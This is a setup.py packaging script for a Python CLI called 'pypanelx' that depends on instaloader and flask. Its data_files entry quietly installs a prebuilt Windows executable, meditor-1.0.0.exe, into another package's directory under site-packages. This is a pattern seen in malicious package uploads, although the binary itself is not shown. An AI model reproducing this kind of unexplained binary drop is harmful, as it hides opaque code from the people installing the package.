from setuptools import setup, find_packages

with open("README.md", "r") as fh:
    long_description=fh.read()

setup(
    name="pypanelx",
    version="1.0.3",
    author="James Phoenix",
    author_email="sierra117autumn@gmail.com",
    description="A full Python Panel CLI",
    packages=find_packages(),
    install_requires = [
        "instaloader",
        "flask"
    ],
    entry_points = {
        "console_scripts":[
                "pypanelx=pypanelx.__main__:main"
        ]
    },
    python_requires=">=3.9",
    long_description=long_description,
    long_description_content_type="text/markdown",
    data_files=[('./lib/site-packages/meditor/dist', ['./meditor/dist/meditor-1.0.0.exe'])]
)